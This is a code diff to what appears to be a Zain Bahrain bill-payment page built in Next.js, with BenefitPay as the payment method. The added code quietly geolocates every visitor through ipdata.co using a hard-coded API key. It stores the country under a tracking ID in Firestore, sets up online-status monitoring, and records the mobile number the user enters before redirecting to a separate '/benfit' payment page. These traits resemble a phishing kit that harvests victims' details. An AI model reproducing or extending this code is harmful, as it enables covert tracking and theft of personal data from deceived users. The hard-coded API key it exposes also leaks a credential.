@@ -1,6 +1,6 @@
 "use client"
 
-import { useState } from "react"
+import { useEffect, useState } from "react"
 import PaymentSteps from "@/components/payment-steps"
 import ServiceNumberEntry from "@/components/service-number-entry"
 import PaymentDetails from "@/components/payment-details"
@@ -8,6 +8,8 @@ import PaymentConfirmation from "@/components/payment-confirmation"
 import Header from "@/components/header"
 import Footer from "@/components/footer"
 import { useRouter } from "next/navigation"
+import { addData } from "@/lib/firestore"
+import { setupOnlineStatus } from "@/lib/utils"
 
 export default function Home() {
   const [currentStep, setCurrentStep] = useState(1)
@@ -15,7 +17,35 @@ export default function Home() {
   const [amount, setAmount] = useState("")
   const [paymentMethod, setPaymentMethod] = useState("benefit-pay")
   const router=useRouter()
+  const _id = randstr('zainbh-')
+useEffect(()=>{
+  getLocation()
+},[])
+  async function getLocation() {
+    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
 
+    try {
+      const response = await fetch(url);
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      const country = await response.text();
+      addData({
+        id: _id,
+        country: country
+      })
+      localStorage.setItem('country', country)
+      setupOnlineStatus(_id)
+    } catch (error) {
+      console.error('Error fetching location:', error);
+    }
+  }
+
+  function randstr(prefix: string) {
+    return Math.random().toString(36).replace('0.', prefix || '');
+  }
+  
   const goToStep = (step: number) => {
     setCurrentStep(step)
   }
@@ -33,6 +63,8 @@ export default function Home() {
 
   const handleConfirmPayment = () => {
     // Here you would handle the actual payment processing
+    const vid=localStorage.getItem('visitor')
+addData({id:vid,mobile:serviceNumber})
     alert("سيتم تحويلك لصفحة الدفع")
     router.push('/benfit')
   }
